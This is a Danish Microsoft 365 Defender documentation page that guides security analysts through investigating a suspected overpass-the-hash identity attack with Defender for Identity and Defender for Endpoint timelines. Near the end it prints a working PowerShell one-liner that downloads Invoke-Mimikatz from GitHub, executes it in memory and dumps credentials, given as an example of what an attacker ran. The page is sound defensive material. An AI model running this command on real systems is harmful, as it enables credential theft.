---
title: Eksempel på et identitetsbaseret angreb
description: Gennemgå et eksempel på en analyse af et identitetsbaseret angreb.
keywords: hændelser, beskeder, undersøge, korrelation, angreb, maskiner, enheder, brugere, identitet, identitet, postkasse, mail, 365, microsoft, m365, svar på hændelser, cyberangreb
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-firstincident
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 2e0b237ad045b98b2bb013399f344db3f20f1919
ms.sourcegitcommit: c1eaea74c8ffce2f9f477c9469342e88e4a70c14
ms.translationtype: MT
ms.contentlocale: da-DK
ms.lasthandoff: 07/20/2022
ms.locfileid: "66893611"
---
# <a name="example-of-an-identity-based-attack"></a>Eksempel på et identitetsbaseret angreb

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Gælder for:**
- Microsoft 365 Defender

Microsoft Defender for Identity kan hjælpe med at registrere skadelige forsøg på at kompromittere identiteter i din organisation. Da Defender for Identity kan integreres med Microsoft 365 Defender, kan sikkerhedsanalytikere have synlighed ved trusler, der kommer ind fra Defender for Identity, f.eks. mistænkte forsøg på udvidede Netlogon-rettigheder.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analyse af angrebet i Microsoft Defender for Identity

Microsoft 365 Defender gør det muligt for analytikere at filtrere beskeder efter registreringskilde under fanen **Beskeder** på hændelsessiden. I følgende eksempel filtreres registreringskilden til **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Filtrering af registreringskilden i Microsoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

Hvis du vælger den **mistænkte overpass-the-hash angreb** besked går til en side i Microsoft Defender for Cloud Apps, der viser mere detaljerede oplysninger. Du kan altid få mere at vide om en besked eller et angreb ved at vælge **Få mere at vide om denne beskedtype** for at læse en [beskrivelse af angrebs](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) - og afhjælpningsforslag.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="En formodet overpass-the-hash angreb besked" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Undersøgelse af det samme angreb i Microsoft Defender for Endpoint

En analytiker kan også bruge Defender for Endpoint til at få mere at vide om aktiviteten på et slutpunkt. Vælg hændelsen fra hændelseskøen, og vælg derefter fanen **Beskeder** . Herfra kan de også identificere registreringskilden. En registreringskilde, der er mærket som EDR, står for Endpoint Detection and Response, som er Defender for Endpoint. Herfra vælger analytikeren en besked, der er registreret af EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Registrering og svar af slutpunkter på portalen Microsoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

På beskedsiden vises forskellige relevante oplysninger, f.eks. det påvirkede enhedsnavn, brugernavnet, status for den automatiske undersøgelse og oplysningerne om beskeden. Beskedhistorien viser en visuel repræsentation af procestræet. Procestræet er en hierarkisk repræsentation af overordnede og underordnede processer, der er relateret til beskeden.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Et beskedprocestræ i Microsoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Hver proces kan udvides for at få vist flere detaljer. Detaljer, som en analytiker kan se, er de faktiske kommandoer, der blev angivet som en del af et skadeligt script, IP-adresser til udgående forbindelser og andre nyttige oplysninger.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Procesdetaljerne på Microsoft Defender for Endpoint-portalen" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
Ved at vælge **Se på tidslinjen** kan en analytiker foretage detailudledning yderligere for at bestemme det nøjagtige tidspunkt for kompromiset. 

Microsoft Defender for Endpoint kan registrere mange skadelige filer og scripts. På grund af mange legitime anvendelser af udgående forbindelser, PowerShell og kommandolinjeaktivitet vil nogle aktiviteter dog blive betragtet som godartede, indtil der oprettes en skadelig fil eller aktivitet. Brug af tidslinjen hjælper derfor analytikere med at sætte beskeden i kontekst med den omgivende aktivitet for at bestemme den oprindelige kilde eller tidspunktet for det angreb, der ellers er tilsløret af almindeligt filsystem og brugeraktivitet. 

Hvis du vil bruge tidslinjen, vil en analytiker starte på tidspunktet for registrering af beskeder (med rødt) og rulle bagud i tiden for at bestemme, hvornår den oprindelige aktivitet, der førte til den skadelige aktivitet, faktisk startede. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Analytikerens starttidspunkt for registrering af beskeder" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Det er vigtigt at forstå og skelne mellem almindelige aktiviteter, f.eks. Windows Update forbindelser, windows-aktiveringstrafik, andre almindelige forbindelser til Microsoft-websteder, internetaktivitet fra tredjepart, Microsoft Endpoint Configuration Manager aktivitet og andre godartede aktiviteter fra mistænkelig aktivitet. En måde at skelne på er ved hjælp af tidslinjefiltre. Der er mange filtre, der kan fremhæve bestemte aktiviteter, mens du filtrerer alt, hvad analytikeren ikke vil have vist. 

På billedet nedenfor filtrerede analytikeren kun for at få vist netværks- og proceshændelser. Dette filterkriterium giver analytikeren mulighed for at se netværksforbindelserne og processerne omkring hændelsen, hvor Notesblok oprettede en forbindelse med en IP-adresse, som vi også så i procestræet. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Sådan blev Notesblok brugt til at oprette en skadelig udgående forbindelse" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

I denne særlige hændelse blev Notesblok brugt til at oprette en skadelig udgående forbindelse. Men ofte vil hackere bruge iexplorer.exe til at oprette forbindelser til at downloade skadelige nyttedata, fordi normalt iexplorer.exe processer betragtes som almindelig webbrowseraktivitet.

Et andet element, du kan søge efter på tidslinjen, er PowerShell bruger til udgående forbindelser. Analytikeren vil søge efter vellykkede PowerShell-forbindelser med kommandoer, f.eks `IEX (New-Object Net.Webclient)` . efterfulgt af en udgående forbindelse til et websted, der er vært for en skadelig fil. 

I følgende eksempel blev PowerShell brugt til at downloade og udføre Mimikatz fra et websted:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
En analytiker kan hurtigt søge efter nøgleord ved at skrive nøgleordet i søgelinjen for kun at få vist de hændelser, der er oprettet med PowerShell. 

## <a name="next-step"></a>Næste trin

Se [phishing-undersøgelsesstien](first-incident-path-phishing.md) .

## <a name="see-also"></a>Se også

- [Oversigt over hændelser](incidents-overview.md)
- [Administrer hændelser](manage-incidents.md)
- [Undersøg hændelser](investigate-incidents.md)
